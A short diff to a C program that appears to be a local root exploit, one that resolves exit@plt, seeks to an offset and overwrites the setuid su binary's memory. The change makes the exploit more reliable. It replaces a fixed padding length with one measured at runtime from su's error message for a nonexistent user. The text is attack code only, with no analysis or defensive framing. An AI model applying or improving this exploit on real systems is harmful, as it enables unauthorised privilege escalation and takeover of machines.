@@ -189,7 +189,13 @@ int main(int argc, char **argv)
 			}
 			printf("[+] Resolved exit@plt to 0x%lx.\n", address);
 		}
-		unsigned long su_padding = strlen("Unknown id: ");
+		printf("[+] Calculating su padding.\n");
+		FILE *command = popen("su this-user-does-not-exist 2>&1", "r");
+		char result[256];
+		result[0] = 0;
+		fgets(result, 256, command);
+		pclose(command);
+		unsigned long su_padding = (strstr(result, "this-user-does-not-exist") - result) / sizeof(char);
 		unsigned long offset = address - su_padding;
 		printf("[+] Seeking to offset 0x%lx.\n", offset);
 		lseek64(fd, offset, SEEK_SET);
